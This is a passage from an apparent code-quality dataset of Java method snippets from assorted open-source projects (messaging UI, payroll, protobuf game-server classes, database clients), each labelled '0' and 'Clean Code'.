 else     if (lastSepIdx == i - 1) {
      if (!Character.isDigit(c)) {
        break;
      }
      count++;
    }
  }
  return count;
}",0,Clean Code
"public void startRecordingIfFromSpeaker(){
  if (!useFrontSpeaker || raiseChat == null || !allowStartRecord || !SharedConfig.enabledRaiseTo(true)) {
    return;
  }
  raiseToEarRecord=true;
  startRecording(raiseChat.getCurrentAccount(),raiseChat.getDialogId(),null,raiseChat.getThreadMessage(),null,raiseChat.getClassGuid(),false,raiseChat != null ? raiseChat.quickReplyShortcut : null,raiseChat != null ? raiseChat.getQuickReplyId() : 0);
  ignoreOnPause=true;
}",0,Clean Code
"@Override public void tempSaveAnswer(AnswerRequest request){
  String projectId=request.getProjectId();
  if (!Integer.valueOf(0).equals(request.getTempSave()) || request.getTempAnswer() == null || projectId == null) {
    return;
  }
  String answerId=ContextHelper.getCookie(AppConsts.COOKIE_RANDOM_PROJECT_PREFIX + projectId);
  if (answerId == null) {
    return;
  }
  if (!SecurityContextUtils.isAuthenticated()) {
    return;
  }
  AnswerRequest answerRequest=new AnswerRequest();
  answerRequest.setId(answerId);
  answerRequest.setTempSave(0);
  answerRequest.setTempAnswer(request.getTempAnswer());
  answerService.updateAnswer(answerRequest);
}",0,Clean Code
"public static String queryTaskList(){
  return RpcUtil.request(""alipay.antocean.ocean.h5.queryTaskList"",""[{\""extend\"":{},\""fromAct\"":\""dynamic_task\"",\""sceneCode\"":\""ANTOCEAN_TASK\"",\""source\"":\""ANT_FOREST\"",\""uniqueId\"":\"""" + getUniqueId() + ""\"",\""version\"":\""""+ VERSION+ ""\""}]"");
}",0,Clean Code
"@Override public TreeVisitor<?,ExecutionContext> getVisitor(){
  return new XmlIsoVisitor<ExecutionContext>(){
    @Override public Xml.Tag visitTag(    Xml.Tag tag,    ExecutionContext ctx){
      Xml.Tag t=super.visitTag(tag,ctx);
      if (t != null && (t.getContent() == null || t.getContent().isEmpty()) && t.getAttributes().isEmpty()) {
        doAfterVisit(new RemoveContentVisitor<>(t,true));
      }
      return t;
    }
  }
;
}
",0,Clean Code
"public void loadLibraries(){
  if (mAllClasses == null)   return;
  List<SignatureInfo> libraryInfoList=new ArrayList<>();
  ArrayList<String> missingLibs=new ArrayList<>();
  String[] libNames=getApplication().getResources().getStringArray(R.array.lib_names);
  String[] libSignatures=getApplication().getResources().getStringArray(R.array.lib_signatures);
  String[] libTypes=getApplication().getResources().getStringArray(R.array.lib_types);
  int[] signatureCount=new int[libSignatures.length];
  mLibraryClasses=new ArrayList<>();
  for (  String className : mAllClasses) {
    if (className.length() > 8 && className.contains(""."")) {
      boolean matched=false;
      for (int i=0; i < libSignatures.length; i++) {
        if (className.contains(libSignatures[i])) {
          matched=true;
          mLibraryClasses.add(className);
          signatureCount[i]++;
          break;
        }
      }
      if (!matched && (mPackageName != null && !className.startsWith(mPackageName)) && !SIG_TO_IGNORE.matcher(className).matches()) {
        missingLibs.add(className);
      }
    }
  }
  for (int i=0; i < libSignatures.length; i++) {
    if (signatureCount[i] == 0)     continue;
    SignatureInfo signatureInfo=new SignatureInfo(libSignatures[i],libNames[i],libTypes[i]);
    signatureInfo.setCount(signatureCount[i]);
    libraryInfoList.add(signatureInfo);
  }
  mLibraryClassesLiveData.postValue(libraryInfoList);
  mMissingClassesLiveData.postValue(missingLibs);
}",0,Clean Code
"@Override @Transactional(rollbackFor=Exception.class) public void saveInitConfig(HrmSalaryConfig salaryConfig){
  HrmSalaryConfig one=getOne(Wrappers.emptyWrapper());
  if (salaryConfig.getSalaryStartMonth() != null) {
    String salaryStartMonth=salaryConfig.getSalaryStartMonth();
    DateTime date=DateUtil.parse(salaryStartMonth,""yyyy-MM"");
    int month=date.month() + 1;
    int year=date.year();
    DateTime startTime=DateUtil.parse(year + ""-"" + month+ ""-""+ one.getSalaryCycleStartDay(),""yyyy-MM-dd"");
    DateTime endTime;
    if (one.getSalaryCycleStartDay() > 1) {
      DateTime dateTime=DateUtil.offsetMonth(startTime,1);
      int nextMonth=dateTime.month() + 1;
      endTime=DateUtil.parse(year + ""-"" + nextMonth+ ""-""+ one.getSalaryCycleEndDay(),""yyyy-MM-dd"");
    }
 else {
      endTime=DateUtil.parseDate(DateUtil.formatDate(DateUtil.endOfMonth(startTime)));
    }
    HrmSalaryMonthRecord salaryMonthRecord=new HrmSalaryMonthRecord();
    salaryMonthRecord.setTitle(HrmLanguageEnum.parseName(month) + HrmLanguageEnum.SALARY_REPORT.getName());
    salaryMonthRecord.setYear(year);
    salaryMonthRecord.setMonth(month);
    salaryMonthRecord.setStartTime(startTime.toLocalDateTime().toLocalDate());
    salaryMonthRecord.setEndTime(endTime.toLocalDateTime().toLocalDate());
    ApplicationContextHolder.getBean(IHrmSalaryMonthRecordService.class).save(salaryMonthRecord);
  }
  if (one == null) {
    save(salaryConfig);
  }
 else {
    salaryConfig.setConfigId(one.getConfigId());
    updateById(salaryConfig);
  }
  HrmSalaryConfig salaryConfig1=getOne(Wrappers.emptyWrapper());
  if (StrUtil.isNotEmpty(salaryConfig1.getSocialSecurityStartMonth())) {
    updateInitStatus(ConfigType.INSURANCE_INIT_CONFIG2.getValue());
    insuranceMonthRecordService.computeInsuranceData();
  }
  if (salaryConfig.getSalaryStartMonth() != null && salaryConfig1.getSalaryCycleStartDay() != null && salaryConfig1.getSocialSecurityMonthType() != null) {
    updateInitStatus(ConfigType.SALARY_INIT_CONFIG2.getValue());
  }
}",0,Clean Code
"protected InternalLayoutThread(final BinDiffGraph<?,?> graph,final CanonicMultiStageLayouter layouter){
  this.graph=graph;
  this.layouter=layouter;
}
",0,Clean Code
"protected boolean checkNeedDrawShareButton(MessageObject messageObject){
  if (currentMessageObject.deleted && !currentMessageObject.deletedByThanos || currentMessageObject.isSponsored()) {
    return false;
  }
  if (currentMessagesGroup != null && currentPosition != null) {
    final boolean last=(currentPosition.flags & MessageObject.POSITION_FLAG_BOTTOM) != 0 && (currentPosition.flags & (messageObject.isOutOwner() ? MessageObject.POSITION_FLAG_LEFT : MessageObject.POSITION_FLAG_RIGHT)) != 0;
    if (!currentMessagesGroup.isDocuments && !last) {
      return false;
    }
  }
  return messageObject.needDrawShareButton();
}",0,Clean Code
"public static com.google.protobuf.Parser<Data> parser(){
  return PARSER;
}
public static com.google.protobuf.Parser<FieldDataSnapshot> parser(){
  return PARSER;
}
",0,Clean Code
"private void deleteAllIndices(){
  ImmutableOpenMap<String,IndexMetaData> indices=elasticSearchClient.admin().cluster().prepareState().get().getState().getMetaData().getIndices();
  indices.forEach(cursor -> {
    try {
      elasticSearchClient.admin().indices().delete(new DeleteIndexRequest(cursor.value.getIndex().getName())).get();
    }
 catch (    InterruptedException|ExecutionException e) {
      throw new RuntimeException(e);
    }
  }
);
}
",0,Clean Code
"public NullPropagatingOperationNode(SourceSection sourceSection,ExpressionNode expressionNode){
  super(sourceSection);
  this.expressionNode=expressionNode;
}
",0,Clean Code
"@Override public void visitString(String value){
  write(""<string>"");
  write(charEscaper.escape(value));
  write(""</string>"");
}
",0,Clean Code
"public void runDecider(String workflowId){
  Preconditions.checkArgument(StringUtils.isNotBlank(workflowId),""workflow id cannot be blank"");
  stub.decideWorkflow(WorkflowServicePb.DecideWorkflowRequest.newBuilder().setWorkflowId(workflowId).build());
}
",0,Clean Code
"@Override public ChessRogueMiracleInfo clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  miracleData.clearQuick();
  return this;
}",0,Clean Code
"@Override public Chat clone(){
  return new Chat().copyFrom(this);
}
",0,Clean Code
"/** 
 * <code>optional uint32 aeon_id = 12;</code>
 * @return the aeonId
 */
public int getAeonId(){
  return aeonId;
}",0,Clean Code
"private void hideEmojiView(){
  if (!emojiViewVisible && emojiView != null && emojiView.getVisibility() != GONE) {
    emojiView.setVisibility(GONE);
  }
  emojiPadding=0;
}",0,Clean Code
"@Override public ReturnT<String> registry(RegistryParam registryParam){
  if (!StringUtils.hasText(registryParam.getRegistryGroup()) || !StringUtils.hasText(registryParam.getRegistryKey()) || !StringUtils.hasText(registryParam.getRegistryValue())) {
    return new ReturnT<String>(ReturnT.FAIL_CODE,""Illegal Argument."");
  }
  int ret=jobRegistryMapper.registryUpdate(registryParam.getRegistryGroup(),registryParam.getRegistryKey(),registryParam.getRegistryValue(),registryParam.getCpuUsage(),registryParam.getMemoryUsage(),registryParam.getLoadAverage(),new Date());
  if (ret < 1) {
    jobRegistryMapper.registrySave(registryParam.getRegistryGroup(),registryParam.getRegistryKey(),registryParam.getRegistryValue(),registryParam.getCpuUsage(),registryParam.getMemoryUsage(),registryParam.getLoadAverage(),new Date());
    freshGroupRegistryInfo(registryParam);
  }
  return ReturnT.SUCCESS;
}",0,Clean Code
"@Test public void testInsertions(){
  Random random=random();
  int numDocsInPQ=TestUtil.nextInt(random,1,100);
  var pq=new BoundedLongHeap(numDocsInPQ);
  Long lastLeast=null;
  var sds=new ArrayList<Long>(numDocsInPQ);
  for (int i=0; i < numDocsInPQ * 10; i++) {
    long newEntry=Math.abs(random.nextLong());
    sds.add(newEntry);
    pq.push(newEntry);
    checkValidity(pq);
    long newLeast=pq.top();
    if ((lastLeast != null) && (newLeast != newEntry) && (newLeast != lastLeast)) {
      assertTrue(newLeast <= newEntry);
      assertTrue(newLeast >= lastLeast);
    }
    lastLeast=newLeast;
  }
}",0,Clean Code
"@Test public void test_Input_defaults(){
  PromptTemplateFactory.Input input=() -> ""template"";
  assertThat(input.getName()).isEqualTo(""template"");
}
",0,Clean Code
"/** 
 * {@link PageRequest} to {@link Page}
 */
public static Page convert(PageRequest pageRequest){
  return convert(pageRequest.getCurrent(),pageRequest.getSize());
}
/** 
 * {@link PageRequest} to {@link Page}
 */
public static Page convert(long current,long size){
  return new Page(current,size);
}
/** 
 * {@link IPage} to {@link PageResponse}
 */
public static PageResponse convert(IPage iPage){
  return buildConventionPage(iPage);
}
/** 
 * {@link IPage} to {@link PageResponse}
 */
public static <TARGET,ORIGINAL>PageResponse<TARGET> convert(IPage<ORIGINAL> iPage,Class<TARGET> targetClass){
  iPage.convert(each -> BeanUtil.convert(each,targetClass));
  return buildConventionPage(iPage);
}
/** 
 * {@link IPage} to {@link PageResponse}
 */
public static <TARGET,ORIGINAL>PageResponse<TARGET> convert(IPage<ORIGINAL> iPage,Function<? super ORIGINAL,? extends TARGET> mapper){
  List<TARGET> targetDataList=iPage.getRecords().stream().map(mapper).collect(Collectors.toList());
  return PageResponse.<TARGET>builder().current(iPage.getCurrent()).size(iPage.getSize()).records(targetDataList).total(iPage.getTotal()).build();
}
",0,Clean Code
"private boolean matchTag(String tag,String filter){
  if (null == tag || null == filter) {
    return false;
  }
  String tagNamespace;
  String tagName;
  String filterNamespace;
  String filterName;
  int index=tag.indexOf(':');
  if (index < 0) {
    tagNamespace=null;
    tagName=tag;
  }
 else {
    tagNamespace=tag.substring(0,index);
    tagName=tag.substring(index + 1);
  }
  index=filter.indexOf(':');
  if (index < 0) {
    filterNamespace=null;
    filterName=filter;
  }
 else {
    filterNamespace=filter.substring(0,index);
    filterName=filter.substring(index + 1);
  }
  if (null != tagNamespace && null != filterNamespace && !tagNamespace.equals(filterNamespace)) {
    return false;
  }
  if (!tagName.equals(filterName)) {
    return false;
  }
  return true;
}",0,Clean Code
"/** 
 * <code>optional int64 time = 9;</code>
 * @return whether the time field is set
 */
public boolean hasTime(){
  return (bitField0_ & 0x00000002) != 0;
}",0,Clean Code
"@Override public RogueAvatarInfo create(){
  return RogueAvatarInfo.newInstance();
}
",0,Clean Code
"@Override public void actionPerformed(final ActionEvent event){
  if (m_action.equals(""UP"")) {
    MoveFunctions.pan(m_graph,0,-1);
  }
 else   if (m_action.equals(""DOWN"")) {
    MoveFunctions.pan(m_graph,0,1);
  }
 else   if (m_action.equals(""LEFT"")) {
    MoveFunctions.pan(m_graph,-1,0);
  }
 else   if (m_action.equals(""RIGHT"")) {
    MoveFunctions.pan(m_graph,1,0);
  }
 else   if (m_action.equals(""+"")) {
    m_graph.zoomIn();
  }
 else   if (m_action.equals(""-"")) {
    m_graph.zoomOut();
  }
 else   if (m_action.equals(""m"")) {
    m_graph.getView().fitContent(true);
  }
 else   if (m_action.equals(""s"")) {
    ZoomFunctions.zoomToNodes(m_graph,SelectedVisibleFilter.filter(m_graph.getSelectedNodes()));
  }
 else   if (m_action.equals(""SELECT_VISIBLE_NODES"")) {
    final Collection<NodeType> nodes=NodeFunctions.getVisibleNodes(m_graph);
    m_graph.selectNodes(nodes,true);
  }
 else   if (m_action.equals(""COPY_CONTENT_FROM_SELECTED_NODES"")) {
    ClipboardHelpers.copyToClipboard(GraphHelpers.getSelectedContent(m_graph));
  }
}",0,Clean Code
"List<PreferenceItem> searchFor(final String keyword,boolean fuzzy){
  if (TextUtils.isEmpty(keyword)) {
    return new ArrayList<>();
  }
  ArrayList<PreferenceItem> results=new ArrayList<>();
  for (  PreferenceItem item : allEntries) {
    if ((fuzzy && item.matchesFuzzy(keyword)) || (!fuzzy && item.matches(keyword))) {
      results.add(item);
    }
  }
  results.sort((i1,i2) -> floatCompare(i2.getScore(keyword),i1.getScore(keyword)));
  if (results.size() > MAX_RESULTS) {
    return results.subList(0,MAX_RESULTS);
  }
 else {
    return results;
  }
}",0,Clean Code
"public ArrayList<TLRPC.EmojiStatus> getRecentEmojiStatuses(){
  final int type=0;
  if (!emojiStatusesFromCacheFetched[type]) {
    fetchEmojiStatuses(type,true);
  }
 else   if (emojiStatuses[type] == null || emojiStatusesFetchDate[type] != null && (System.currentTimeMillis() / 1000 - emojiStatusesFetchDate[type]) > 60 * 30) {
    fetchEmojiStatuses(type,false);
  }
  return emojiStatuses[type];
}",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    for (int i=0; i < farmStageGachaIdList.length(); i++) {
      output.writeRawByte((byte)48);
      output.writeUInt32NoTag(farmStageGachaIdList.array()[i]);
    }
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRepeatedUInt32(FieldNames.farmStageGachaIdList,farmStageGachaIdList);
  }
  output.endObject();
}",0,Clean Code
"@Override public void onFailed(Alarm alarm,List<AlarmTarget> targetUserList){
  if (CollectionUtils.isEmpty(targetUserList) || javaMailSender == null || StringUtils.isEmpty(from)) {
    return;
  }
  SimpleMailMessage sm=new SimpleMailMessage();
  try {
    sm.setFrom(from);
    sm.setTo(targetUserList.stream().map(AlarmTarget::getEmail).filter(Objects::nonNull).filter(email -> !email.isEmpty()).toArray(String[]::new));
    sm.setSubject(alarm.fetchTitle());
    sm.setText(alarm.fetchContent());
    javaMailSender.send(sm);
  }
 catch (  Exception e) {
    log.warn(""[MailAlarmService] send mail failed, reason is {}"",e.getMessage());
  }
}
",0,Clean Code
"@Override public void onSignalBarsCountChanged(int count){
  if (count > 0) {
    signalBarWasReceived=true;
  }
  if (statusTextView != null && gradientLayout != null && gradientLayout.isConnectedCalled() && signalBarWasReceived) {
    AndroidUtilities.runOnUIThread(() -> {
      statusTextView.setSignalBarCount(count);
      if (count <= 1) {
        gradientLayout.showToBadConnection();
        statusTextView.showBadConnection(true,true);
      }
 else {
        gradientLayout.hideBadConnection();
        statusTextView.showBadConnection(false,true);
      }
    }
,400);
  }
}",0,Clean Code
"/** 
 * Removes any existing external properties, then adds the given properties. <p>This is a convenience method that delegates to the underlying evaluator builder.
 */
public ConfigEvaluatorBuilder setExternalProperties(Map<String,String> properties){
  evaluatorBuilder.setExternalProperties(properties);
  return this;
}
",0,Clean Code
"private List<CsvVariable> getCsvVariables(ScenarioConfig scenarioConfig){
  if (scenarioConfig == null || scenarioConfig.getVariable() == null || scenarioConfig.getVariable().getCsvVariables() == null) {
    return List.of();
  }
  return scenarioConfig.getVariable().getCsvVariables();
}
private List<CsvVariable> getCsvVariables(String scenarioId){
  ApiScenarioCsvExample example=new ApiScenarioCsvExample();
  example.createCriteria().andScenarioIdEqualTo(scenarioId);
  List<ApiScenarioCsv> csvList=apiScenarioCsvMapper.selectByExample(example);
  List<CsvVariable> csvVariables=csvList.stream().map(apiScenarioCsv -> {
    CsvVariable csvVariable=BeanUtils.copyBean(new CsvVariable(),apiScenarioCsv);
    ApiFile apiFile=new ApiFile();
    apiFile.setFileId(apiScenarioCsv.getFileId());
    apiFile.setLocal(!apiScenarioCsv.getAssociation());
    apiFile.setFileName(apiScenarioCsv.getFileName());
    csvVariable.setFile(apiFile);
    return csvVariable;
  }
).collect(Collectors.toList());
  return csvVariables;
}
",0,Clean Code
"@Override public void onItemsAdded(RecyclerView recyclerView,int positionStart,int itemCount){
  if (DEBUG)   Log.v(getTag(),""onItemsAdded positionStart "" + positionStart + "" itemCount ""+ itemCount);
  if (mFocusPosition != NO_POSITION && mGrid != null && mGrid.getFirstVisibleIndex() >= 0 && mFocusPositionOffset != Integer.MIN_VALUE) {
    int pos=mFocusPosition + mFocusPositionOffset;
    if (positionStart <= pos) {
      mFocusPositionOffset+=itemCount;
    }
  }
  mChildrenStates.clear();
}",0,Clean Code
"@Override public String duoLaBaoNotify(Map<String,String> notifyMap) throws Exception {
  if (!notifyMap.containsKey(""timestamp"") || !notifyMap.containsKey(""token"") || notifyMap.get(""status"") == null || !notifyMap.get(""status"").equals(""SUCCESS"")) {
    return null;
  }
  CfOrder cfOrder=cfOrderService.findById(notifyMap.get(""requestNum""),false);
  if (cfOrder == null) {
    ExceptionCast.cast(PayCode.ORDER_DOES_NOT_EXIST,notifyMap.toString());
  }
  if (cfOrder.getStatus() == PayStatus.PAID) {
    return null;
  }
  CfUserPaymentAgency cfUserPaymentAgency=cfUserPaymentAgencyService.findById(cfOrder.getUserPaymentAgencyId());
  if (cfUserPaymentAgency == null) {
    ExceptionCast.cast(PayCode.MERCHANT_PAYMENT_ACCOUNT_DOES_NOT_EXIST,notifyMap.toString());
  }
  String token=BCryptUtil.SHA1(""secretKey="" + cfUserPaymentAgency.getSecret() + ""&timestamp=""+ notifyMap.get(""timestamp""));
  if (!token.toUpperCase().equals(notifyMap.get(""token""))) {
    return null;
  }
  cfOrder.setThirdPartyOrderId(notifyMap.get(""orderNum""));
  cfOrder.setPayTime(DateUtil.dateToStamp(notifyMap.get(""completeTime""),""yyyyMMddHHmmss""));
  cfOrderService.paySuccessAndupdateOrder(cfOrder,(new BigDecimal(notifyMap.get(""orderAmount""))));
  return ""ok"";
}",0,Clean Code
"/** 
 * Determines whether a given node is a proximity node.
 * @param graph The graph the node belongs to.
 * @param node The node to check.
 * @return True, if the node is a proximity node. False, otherwise.
 */
public static boolean isProximityNode(final AbstractZyGraph<?,?> graph,final Node node){
  Preconditions.checkNotNull(graph,""Graph argument can not be null"");
  Preconditions.checkNotNull(node,""Node argument can not be null"");
  return graph.getGraph().getRealizer(node) instanceof ZyProximityNodeRealizer<?>;
}
",0,Clean Code
"/** 
 * <code>optional uint32 retcode = 9;</code>
 * @param value the retcode to set
 * @return this
 */
public DoGachaInRollShopScRsp setRetcode(final int value){
  bitField0_|=0x00000002;
  retcode=value;
  return this;
}",0,Clean Code
"public static void removeByModuleId(Long moduleId,Integer version){
  List<Flow> flows=ME.flowService.getByModuleIdAndVersion(moduleId,version);
  removeAll(flows);
}
",0,Clean Code
"public void editDescriptor(ActionEvent event){
  OutputDescriptor outputDescriptor=OutputDescriptor.getOutputDescriptor(walletForm.getWallet(),KeyPurpose.DEFAULT_PURPOSES,null);
  String outputDescriptorString=outputDescriptor.toString(walletForm.getWallet().isValid());
  TextAreaDialog dialog=new TextAreaDialog(outputDescriptorString);
  dialog.initOwner(editDescriptor.getScene().getWindow());
  dialog.setTitle(""Edit wallet output descriptor"");
  dialog.getDialogPane().setHeaderText(""The wallet configuration is specified in the output descriptor.\nChanges to the output descriptor will modify the wallet configuration."" + (walletForm.getWallet().getPolicyType() == PolicyType.MULTI ? ""\nKey expressions are shown in canonical order."" : """"));
  Optional<String> text=dialog.showAndWait();
  if (text.isPresent() && !text.get().isEmpty() && !text.get().equals(outputDescriptorString)) {
    if (text.get().contains(""(multi("")) {
      AppServices.showWarningDialog(""Legacy multisig wallet detected"",""Sparrow supports BIP67 compatible multisig wallets only.\n\nThe public keys will be lexicographically sorted, and the output descriptor represented with sortedmulti."");
    }
    setDescriptorText(text.get().replace(""\n"",""""));
  }
}",0,Clean Code
"static SearchResultsWrapper search(MilvusServiceClient milvusClient,SearchParam searchRequest){
  R<SearchResults> response=milvusClient.search(searchRequest);
  checkResponseNotFailed(response);
  return new SearchResultsWrapper(response.getData().getResults());
}
",0,Clean Code
"@NonNull @Override public Dialog onCreateDialog(Bundle savedInstanceState){
  BottomSheetDialog dialog=(BottomSheetDialog)super.onCreateDialog(savedInstanceState);
  dialog.setOnKeyListener(new DialogInterface.OnKeyListener(){
    @Override public boolean onKey(    DialogInterface dialog,    int keyCode,    KeyEvent event){
      if (activity.isFullscreen() && KeyUtil.isMenuKey(event) && Setting.getFullscreenMenuKey() == 1)       dismiss();
      return false;
    }
  }
);
  return dialog;
}",0,Clean Code
"/** 
 * @return a new empty instance of {@code RefreshTriggerByClientScNotify}
 */
public static RefreshTriggerByClientScNotify newInstance(){
  return new RefreshTriggerByClientScNotify();
}
",0,Clean Code
"private static WildcardType canonicalizeWildcardType(TypeVariable<?> declaration,WildcardType type){
  Type[] declared=declaration.getBounds();
  List<Type> upperBounds=new ArrayList<>();
  upperBoundsGenerator:   for (  Type bound : type.getUpperBounds()) {
    for (    Type declaredType : declared) {
      if (of(declaredType).isSubtypeOf(bound)) {
        continue upperBoundsGenerator;
      }
    }
    upperBounds.add(canonicalizeWildcardsInType(bound));
  }
  return new Types.WildcardTypeImpl(type.getLowerBounds(),upperBounds.toArray(new Type[0]));
}",0,Clean Code
"public void reset(int i){
  time=i;
  collected=0;
  helped=0;
  watered=0;
}",0,Clean Code
"/** 
 * Write object class and data without tracking ref. 
 */
public void writeNullable(MemoryBuffer buffer,Object obj){
  if (obj == null) {
    buffer.writeByte(Fury.NULL_FLAG);
  }
 else {
    buffer.writeByte(Fury.NOT_NULL_VALUE_FLAG);
    writeNonRef(buffer,obj);
  }
}
/** 
 * Write object class and data without tracking ref. 
 */
public void writeNullable(MemoryBuffer buffer,Object obj,ClassInfoHolder classInfoHolder){
  if (obj == null) {
    buffer.writeByte(Fury.NULL_FLAG);
  }
 else {
    buffer.writeByte(Fury.NOT_NULL_VALUE_FLAG);
    writeNonRef(buffer,obj,classResolver.getClassInfo(obj.getClass(),classInfoHolder));
  }
}
public void writeNullable(MemoryBuffer buffer,Object obj,ClassInfo classInfo){
  if (obj == null) {
    buffer.writeByte(Fury.NULL_FLAG);
  }
 else {
    buffer.writeByte(Fury.NOT_NULL_VALUE_FLAG);
    writeNonRef(buffer,obj,classInfo);
  }
}
",0,Clean Code
"@Override public final void onPlayerStateChanged(EventTime eventTime,boolean playWhenReady,int playbackState){
  Log.d(tag,""state ["" + playWhenReady + "", ""+ playbackState+ ""]"");
  playerWasPrepared|=playbackState != Player.STATE_IDLE;
  if (playbackState == Player.STATE_ENDED || (playbackState == Player.STATE_IDLE && playerWasPrepared)) {
    stopTest();
  }
  boolean playing=playWhenReady && playbackState == Player.STATE_READY;
  if (!this.playing && playing) {
    lastPlayingStartTimeMs=SystemClock.elapsedRealtime();
  }
 else   if (this.playing && !playing) {
    totalPlayingTimeMs+=SystemClock.elapsedRealtime() - lastPlayingStartTimeMs;
  }
  this.playing=playing;
}
",0,Clean Code
"@Override public Gateserver mergeFrom(final Gateserver other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasPort()) {
    setPort(other.port);
  }
  if (other.hasUnk1()) {
    setUnk1(other.unk1);
  }
  if (other.hasUnk2()) {
    setUnk2(other.unk2);
  }
  if (other.hasUnk3()) {
    setUnk3(other.unk3);
  }
  if (other.hasUnk4()) {
    setUnk4(other.unk4);
  }
  if (other.hasUnk5()) {
    setUnk5(other.unk5);
  }
  if (other.hasUnk6()) {
    setUnk6(other.unk6);
  }
  if (other.hasUnk7()) {
    setUnk7(other.unk7);
  }
  if (other.hasRegionName()) {
    getMutableRegionNameBytes().copyFrom(other.regionName);
  }
  if (other.hasExResourceUrl()) {
    getMutableExResourceUrlBytes().copyFrom(other.exResourceUrl);
  }
  if (other.hasLuaUrl()) {
    getMutableLuaUrlBytes().copyFrom(other.luaUrl);
  }
  if (other.hasAssetBundleUrl()) {
    getMutableAssetBundleUrlBytes().copyFrom(other.assetBundleUrl);
  }
  if (other.hasIp()) {
    getMutableIpBytes().copyFrom(other.ip);
  }
  if (other.hasIfixVersion()) {
    getMutableIfixVersionBytes().copyFrom(other.ifixVersion);
  }
  if (other.hasClientSecretKey()) {
    getMutableClientSecretKeyBytes().copyFrom(other.clientSecretKey);
  }
  if (other.hasIfixUrl()) {
    getMutableIfixUrlBytes().copyFrom(other.ifixUrl);
  }
  if (other.hasMsg()) {
    getMutableMsgBytes().copyFrom(other.msg);
  }
  if (other.hasMdkResVersion()) {
    getMutableMdkResVersionBytes().copyFrom(other.mdkResVersion);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@451362cd!org.eclipse.jdt.core.dom.MethodDeclaration@67e11b5d",0,Clean Code
"@Override public <T extends Annotation>T getAnnotation(Class<T> annotationClass){
  return null;
}
",0,Clean Code
"protected void appendCreatePlaylistButton(){
  if (!mIsCreatePlaylistEnabled) {
    return;
  }
  Video original=getVideo() != null ? getVideo() : new Video();
  BrowsePresenter presenter=BrowsePresenter.instance(getContext());
  if (original.hasVideo() || !(presenter.isPlaylistsSection() && presenter.inForeground())) {
    return;
  }
  getDialogPresenter().appendSingleButton(UiOptionItem.from(getContext().getString(R.string.create_playlist),optionItem -> showCreatePlaylistDialog(original)));
}
",0,Clean Code
"private synchronized void parseBrokerMetadata(){
  if (this.endpointMap != null) {
    return;
  }
  if (this.endpoints == null || this.endpoints.isEmpty()) {
    this.endpointMap=new HashMap<>(0);
    return;
  }
  Map<String,IpPortData> tempEndpointMap=new HashMap<>();
  for (  String endpoint : this.endpoints) {
    int idx1=endpoint.indexOf(""://"");
    int idx2=endpoint.lastIndexOf("":"");
    if (idx1 == -1 || idx2 == -1 || idx1 == idx2) {
      continue;
    }
    String brokerHost=endpoint.substring(idx1 + ""://"".length(),idx2);
    String brokerPort=endpoint.substring(idx2 + 1);
    tempEndpointMap.put(endpoint.substring(0,idx1),new IpPortData(brokerHost,brokerPort));
    if (KafkaConstant.INTERNAL_KEY.equals(endpoint.substring(0,idx1))) {
      this.host=brokerHost;
      this.port=ConvertUtil.string2Integer(brokerPort);
    }
    if (null == this.host) {
      this.host=brokerHost;
      this.port=ConvertUtil.string2Integer(brokerPort);
    }
  }
  this.endpointMap=tempEndpointMap;
}",0,Clean Code
"public String toString(){
  StringBuilder sb=new StringBuilder();
  sb.append(""[Media "");
  sb.append(""uri="").append(uri);
  sb.append("", title="").append(title);
  sb.append("", width="").append(width);
  sb.append("", height="").append(height);
  sb.append("", format="").append(format);
  sb.append("", duration="").append(duration);
  sb.append("", size="").append(size);
  sb.append("", hasBitrate="").append(hasBitrate);
  sb.append("", bitrate="").append(String.valueOf(bitrate));
  sb.append("", persons="").append(persons);
  sb.append("", player="").append(player);
  sb.append("", copyright="").append(copyright);
  sb.append(""]"");
  return sb.toString();
}
",0,Clean Code
"static void insert(MilvusServiceClient milvusClient,String collectionName,List<InsertParam.Field> fields){
  InsertParam request=buildInsertRequest(collectionName,fields);
  R<MutationResult> response=milvusClient.insert(request);
  checkResponseNotFailed(response);
}
",0,Clean Code
"@Override public Integer selectListByConditionCounts(Map<String,Map<String,Object>> conditions,Map<String,String> allowFiledsMap,List<String> allowFileds){
  String sql=""SELECT count(*) FROM cf_car_park_use_log cpul"";
  if (conditions.containsKey(""payment_agency_short_name"") || conditions.containsKey(""payment_agency_short_name$in"") || conditions.containsKey(""amounts_payable"")|| conditions.containsKey(""amount_actually_paid"")|| conditions.containsKey(""status"")) {
    sql+="" LEFT JOIN cf_order ord ON(cpul.id=ord.goods_id)"";
  }
  conditions.remove(""group"");
  sql=DbUtils.makeQuery(conditions,allowFiledsMap,allowFileds,sql,true);
  return cfCarParkUseLogMapper.selectListByConditionCounts(sql);
}
",0,Clean Code
"/** 
 * inputArrayData.type() must be multi-dimension array or Collection, not allowed to be primitive array
 */
public ArrayDataForEach(Expression inputArrayData,TypeRef<?> elemType,SerializableBiFunction<Expression,Expression,Expression> notNullAction){
  this(inputArrayData,elemType,notNullAction,null);
}
/** 
 * inputArrayData.type() must be multi-dimension array or Collection, not allowed to be primitive array
 */
public ArrayDataForEach(Expression inputArrayData,TypeRef<?> elemType,SerializableBiFunction<Expression,Expression,Expression> notNullAction,SerializableFunction<Expression,Expression> nullAction){
  Preconditions.checkArgument(getRawType(inputArrayData.type()) == BinaryArray.class);
  this.inputArrayData=inputArrayData;
  this.accessMethod=BinaryUtils.getElemAccessMethodName(elemType);
  this.elemType=BinaryUtils.getElemReturnType(elemType);
  this.notNullAction=notNullAction;
  this.nullAction=nullAction;
}
",0,Clean Code
"/** 
 * @return factory for creating ItemsEntry messages
 */
public static MessageFactory<ItemsEntry> getFactory(){
  return ItemsEntryFactory.INSTANCE;
}
",0,Clean Code
